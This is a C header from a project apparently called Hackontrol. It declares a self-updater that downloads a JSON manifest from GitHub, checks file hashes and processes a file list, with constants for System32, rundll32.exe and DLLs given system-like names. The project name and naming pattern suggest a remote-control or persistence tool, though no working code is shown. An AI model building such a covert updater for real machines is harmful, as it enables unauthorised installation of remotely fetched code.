#pragma once

#include <khopanwin32.h>
#include <khopancurl.h>
#include <cJSON.h>

#define MESSAGE_BOX(x) MessageBoxW(NULL, x, L"Error", MB_OK | MB_ICONERROR | MB_DEFBUTTON1 | MB_SYSTEMMODAL)
#define FREE(x) if(LocalFree(x)) KHWin32DialogErrorW(GetLastError(), L"LocalFree")

#define FILE_LIBDLL32        L"libdll32.dll"
#define FILE_RUNDLL32        L"rundll32.exe"
#define FILE_LIBUPDATE32     L"libupdate32.dll"
#define FOLDER_SYSTEM32      L"System32"
#define FUNCTION_LIBUPDATE32 L"Update"
#define URL_LATEST_FILE      "https://raw.githubusercontent.com/KHOPAN/Hackontrol/main/system/latest.json"

BOOL DownloadLatestJSON(cJSON** output);
BOOL CheckAndProcessSelfUpdate(cJSON* root);
BOOL CheckFileHash(cJSON* root, LPWSTR filePath);
void ProcessFilesArray(cJSON* root);
